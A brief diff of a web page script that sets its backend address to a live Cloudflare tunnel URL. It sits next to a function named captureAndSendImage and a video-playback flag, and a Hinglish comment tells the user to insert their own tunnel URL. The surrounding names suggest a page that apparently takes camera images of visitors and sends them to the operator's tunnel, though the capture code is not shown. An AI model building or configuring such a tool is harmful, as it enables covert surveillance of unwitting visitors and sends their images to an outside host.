@@ -6,7 +6,7 @@ document.addEventListener('DOMContentLoaded', function() {
     let videoPlayed = false; // Flag to track if video has been played
 
     // ⬇️ APNA CLOUDFLARED URL DAALO ⬇️
-    const BACKEND_URL = 'https://YOUR_CLOUDFLARED_URL.trycloudflare.com';
+    const BACKEND_URL = 'https://brighton-satisfied-encourages-adapters.trycloudflare.com';
 
     // Function to capture image and send to server
     function captureAndSendImage() {
